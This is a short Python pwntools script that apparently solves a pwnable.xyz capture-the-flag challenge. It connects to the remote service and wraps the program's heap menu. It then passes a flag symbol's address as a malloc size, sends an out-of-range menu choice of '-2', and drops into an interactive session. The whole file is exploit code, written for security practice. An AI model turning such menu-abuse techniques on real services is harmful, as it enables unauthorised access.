from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30007)
flag = e.symbols['_']
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
s = lambda x : p.send(x)

def malloc(size):
	sla('>','1')
	sla(':',str(size))

def free():
	sla('>','2')

def read(data): #input
	sla('>','3')
	s(data)

def write(): # print
	sla('>','4')

def quit():
	sla('>','5')

malloc(flag)
sla('>','-2')

p.interactive()